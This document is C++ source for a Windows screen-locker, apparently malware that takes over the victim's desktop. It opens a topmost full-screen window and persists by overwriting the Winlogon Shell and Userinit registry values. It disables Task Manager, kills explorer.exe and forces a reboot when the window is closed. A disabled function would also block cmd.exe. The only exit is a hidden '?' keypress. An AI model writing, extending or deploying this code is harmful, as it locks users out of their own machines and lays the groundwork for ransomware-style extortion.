#define UNICODE
#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include "lib.h"


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int ncmdshow){
    WNDCLASSW SoftwareMainClass = NewWindowClass((HBRUSH)COLOR_WINDOW+1, hInst, L"MainWndClass", SoftwareMainProcedure);

    if(!RegisterClassW(&SoftwareMainClass)){
        return -1;
    }   

    MSG SoftwareMainMessage = { 0 };

    hWnd = CreateWindowExW(WS_EX_OVERLAPPEDWINDOW, L"MainWndClass", NULL, WS_OVERLAPPEDWINDOW, 0, 0, 1920, 1080, NULL, NULL, NULL, NULL);


    ShowWindow(hWnd, SW_MAXIMIZE);
    UpdateWindow(hWnd);

    GetClientRect(hWnd, &rc);
    
    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, rc.right, rc.bottom, 1);


    AddToShell();
    AddToUserInit();
    TurnOffTaskmgr();
    //DisallowRunCmd();

    system("taskkill /im explorer.exe /f");
    

    while (GetMessage(&SoftwareMainMessage, NULL, NULL, NULL)) {
        TranslateMessage(&SoftwareMainMessage);
        DispatchMessage(&SoftwareMainMessage);
    }
    return 0;
}

WNDCLASSW NewWindowClass(HBRUSH BGColor, HINSTANCE hInst, LPCWSTR Name, WNDPROC Procedure) {
    WNDCLASSW NWC = { 0 };

    NWC.hInstance = hInst;
    NWC.lpszClassName = Name; 
    NWC.hbrBackground = BGColor;
    NWC.lpfnWndProc = Procedure;

    return NWC;
}



LRESULT CALLBACK SoftwareMainProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp){
    switch(msg){

    case WM_CHAR:
        switch(wp){
        case '?':
            PostQuitMessage(0);
            break;
        }
        break;
        

    case WM_SYSCOMMAND:
        if(wp == (SC_MOVE+2)){
            return 1;     
        }
        break;

    case WM_CREATE:

        break;

    case WM_CLOSE:
        system("shutdown /r");
        break;
    
    default:
        return DefWindowProc(hWnd, msg, wp, lp);
    }
}


void AddToShell(){
    HKEY hKey;
    GetModuleFileNameA(NULL, szPath, sizeof(szPath)); 
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 
                NULL, 
                (LPSTR)"", 
                REG_OPTION_NON_VOLATILE, 
                KEY_SET_VALUE, 
                NULL, 
                &hKey, 
                NULL);

    if (hKey) { 
        RegSetValueExA(hKey, "Shell", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath)); 
    }
    
}

void AddToUserInit(){
    HKEY hKey;
    GetModuleFileNameA(NULL, szPath, sizeof(szPath)); 
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 
                NULL, 
                (LPSTR)"", 
                REG_OPTION_NON_VOLATILE, 
                KEY_SET_VALUE, 
                NULL, 
                &hKey, 
                NULL);

    if (hKey) { 
        RegSetValueExA(hKey, "Userinit", NULL, REG_SZ, (LPBYTE)(("C:\\Windows\\system32\\userinit.exe, " + (std::string)szPath).c_str()), strlen(szPath) + strlen("C:\\Windows\\system32\\userinit.exe, ")); 
    }
}

void DisallowRunCmd(){
    HKEY hKey;

    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun", 
                NULL, 
                (LPSTR)"", 
                REG_OPTION_NON_VOLATILE, 
                KEY_SET_VALUE, 
                NULL, 
                &hKey, 
                NULL);

    if (hKey) { 
        RegSetValueExA(hKey, "1", NULL, REG_SZ, (LPBYTE)("cmd.exe"), strlen("cmd.exe")); 
    }
}

void TurnOffTaskmgr(){
    HKEY hKey;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                0, 
                (LPSTR)"", 
                NULL, 
                KEY_ALL_ACCESS, 
                NULL, 
                &hKey, 
                NULL);
    
    if (hKey) { 
        RegSetValueExA(hKey, "DisableTaskMgr", NULL, REG_SZ, (LPBYTE)"1", 1); 
    }
}

